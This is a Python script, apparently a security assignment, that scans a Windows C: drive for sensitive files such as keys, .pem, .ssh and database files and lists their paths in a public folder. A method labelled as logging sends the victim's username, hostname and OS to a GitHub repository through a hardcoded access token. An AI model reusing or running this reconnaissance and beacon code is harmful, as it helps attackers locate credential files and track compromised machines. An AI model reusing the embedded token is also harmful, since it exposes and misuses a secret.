class DataSearcher:
   
    def __init__(self, script_name):
        self.script_name = script_name
        self.file_extensions = ['.txt', '.xlsx', '.docx', '.key', '.db', '.json','.pdf','.pem','.ssh','.jpg','.png','.gif','.mp4','.avi', '.mov']
        
    def create_log(self,script_name,status):
        '''This function will create a log (succes/failed) depending on the script's results'''
        import socket
        import platform
        import base64
        import getpass
        import datetime
        from github import Github
        import datetime
        ACCESS_TOKEN ='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'
        FOLDER_PATH ='logs'
        current_datetime = datetime.datetime.now()
        content = f"Script Name: {script_name}\nExecution time: {current_datetime}\nStatus: {status}\n\n"
        username = getpass.getuser()
        hostname = socket.gethostname()
        os_name = platform.system()
        filename = os_name + "_" + hostname + "_" + username
        g = Github(ACCESS_TOKEN)
        repo = g.get_repo("rsecurity12/python_opdracht")
        
        try:
            existing_file = repo.get_contents(f"{FOLDER_PATH}/{filename}")
            sha = existing_file.sha
            existing_content = base64.b64decode(existing_file.content).decode()
            new_content = existing_content + '\n' + content
            repo.update_file(existing_file.path, "Update log", new_content, sha)
        except Exception as e:
            if 'Not Found' in str(e):
                new_file = repo.create_file(f"{FOLDER_PATH}/{filename}", "New log", content)
            else:
                pass

    def run(self):
        '''This function will search for documents specified in our list and save its output to C Users Public data'''
        search_path = 'C:'  # Update the search path as per your requirement
        found_files = []
        import os
        data_path = r"C:\Users\Public\Documents_data"
        if not os.path.exists(data_path):
            os.makedirs(data_path)

        for dirpath, dirnames,filenames in os.walk(search_path):
            for filename in filenames:
                file_extension = os.path.splitext(filename)[1]
                if file_extension in self.file_extensions:
                    file_path = os.path.join(dirpath, filename)
                    found_files.append(file_path)
        if found_files:
            with open(os.path.join(data_path, 'found_data.txt'), 'w') as f:
                for file_path in found_files:
                    f.write(file_path + '\n')
        else:
            pass

data_searcher = DataSearcher('DataSearcher')
try:
    data_searcher.run()
    data_searcher.create_log(data_searcher.script_name,"success")
except:
    data_searcher.create_log(data_searcher.script_name,"failed")